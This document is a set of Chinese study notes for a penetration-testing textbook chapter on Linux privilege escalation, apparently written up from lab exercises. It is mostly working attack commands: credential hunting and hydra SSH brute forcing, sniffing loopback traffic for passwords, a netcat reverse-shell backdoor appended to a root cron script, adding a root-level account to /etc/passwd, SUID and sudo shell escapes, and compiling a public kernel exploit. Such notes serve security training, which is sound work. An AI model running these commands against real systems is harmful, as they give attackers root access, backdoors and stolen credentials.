本篇对应教材第17章，主要内容“Linux提权信息枚举”、“敏感信息”、“不安全的文件权限”和“不安全的系统组件”，记录使用工具和命令

## 17.1 linux提权信息枚举

### 17.1.2 手动枚举

文件权限

```armasm
ls -l /etc/shadow
```

当前用户id

```armasm
id
```

所有用户

```armasm
cat /etc/passwd
```

主机名

```armasm
hostname
```

操作系统信息

```armasm
cat /etc/issue
cat /etc/os-release
uname -a
```

进程信息

```armasm
ps aux
```

关注root权限的

网络信息

```armasm
ip a
routel
ss -anp
```

防火墙规则

```armasm
cat /etc/iptables/rules.v4
```

计划任务

```armasm
ls -lah /etc/cron*
```

关注是否有root权限的文件可以替换

查看当前用户计划任务

```armasm
crontab -l
sudo crontab -l
```

查看已安装程序

```armasm
dpkg -l
```

搜索可写目录

```armasm
find / -writable -type d 2>/dev/null
```

查看已安装文件系统和驱动器

```armasm
cat /etc/fstab
mount
```

查看可用磁盘

```armasm
lsblk
```

可能有未挂载的磁盘里面有敏感信息

查看内核模块

```armasm
lsmod
```

查看模块信息

```armasm
/sbin/modinfo libata
```

查找SUID二进制文件

```armasm
find / -perm -u=s -type f 2>/dev/null
```

### 17.1.3 自动枚举

```armasm
unix-privesc-check
./unix-privesc-check standard > output.txt
```

如/etc/passwd文件可写提权

https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation

其他辅助脚本

```armasm
https://github.com/rebootuser/LinEnum
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
```

## 17.2 敏感信息

### 17.2.1 用户配置中的敏感信息

环境变量（比如密码等信息）

```armasm
env
```

bash配置文件（比如密码等信息）

```armasm
cat .bashrc
```

找到密码后切换用户

```armasm
su - root
whoami
```

根据密码做字典

```armasm
crunch 6 6 -t Lab%%% > wordlist
```

破解指定用户密码

```armasm
hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
```

登录后查看sudo

```armasm
ssh eve@192.168.50.214
sudo -l

User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL
```

直接sudo提权

```armasm
sudo -i
输入eve密码，获得root
whoami
```

### 17.2.2 服务运行痕迹

监测进程中的敏感信息

```armasm
watch -n 1 "ps -aux | grep pass"
```

监测网络通信中的敏感信息

```armasm
sudo tcpdump -i lo -A | grep "pass"
```

## 17.3 不安全的文件权限

### 17.3.1 利用CRON

查看cron日志

```armasm
grep "CRON" /var/log/syslog
```

关注root定时运行的文件，找到后查看内容和权限

```armasm
cat /home/joe/.scripts/user_backups.sh
ls -lah /home/joe/.scripts/user_backups.sh
```

可写，插入一句话后门

```armasm
cd .scripts
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
cat user_backups.sh

nc -lnvp 1234
```

### 17.3.2 利用密码校验

/etc/passwd可写

```armasm
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
Password: w00t
id
```

## 17.4 不安全系统组件

### 17.4.1 利用Setuid二进制文件

查看文件的SUID标志位

```armasm
ls -asl /usr/bin/passwd
```

find

```armasm
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

getcap

```armasm
/usr/sbin/getcap -r / 2>/dev/null
```

perl

```armasm
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

更多suid提权利用查看

https://gtfobins.github.io/

### 17.4.2 sudo利用

查看当前用户可以使用的特权命令

```armasm
sudo -l
```

查看https://gtfobins.github.io/，发现

```armasm
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

没有成功，提示

```armasm
failed: Permission denied
```

查看日志

```armasm
cat /var/log/syslog | grep tcpdump
```

发现是AppArmor限制了，root权限后查看apparmor状态信息

```armasm
su - root
aa-status
发现
/usr/sbin/tcpdump
```

换一个apt-get

```armasm
sudo apt-get changelog apt
!/bin/sh
```

提权成功

### 17.4.3 内核漏洞提权

查看架构及内核版本信息

```armasm
cat /etc/issue
uname -r
arch
```

搜索漏洞

```armasm
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

```armasm
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20
mv 45010.c cve-2017-16995.c
scp cve-2017-16995.c joe@192.168.123.216:
gcc cve-2017-16995.c -o cve-2017-16995
file cve-2017-16995
./cve-2017-16995
```

提权成功

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
